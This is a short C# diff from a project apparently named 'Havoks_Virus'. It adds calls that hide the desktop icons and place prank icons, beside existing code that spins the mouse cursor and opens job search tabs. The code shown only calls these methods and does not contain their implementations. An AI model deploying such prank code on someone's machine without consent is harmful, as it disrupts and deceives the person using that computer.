@@ -111,7 +111,16 @@ namespace Havoks_Virus
             Mouse prankMouse = new Mouse("Media/rspin.ani");
             prankMouse.StartMouseMovement();
 
-            
+            // Instantiate the DtIcon class
+            DtIcon prankIcons = new DtIcon();
+
+            // Hide desktop icons (if this is part of the prank initialization)
+            prankIcons.HideDesktopIcons();
+
+            // Create prank icons on desktop
+            prankIcons.CreatePrankIcons();
+
+
         }
 
         // Logic to open job search tabs only once, delayed by 7 seconds
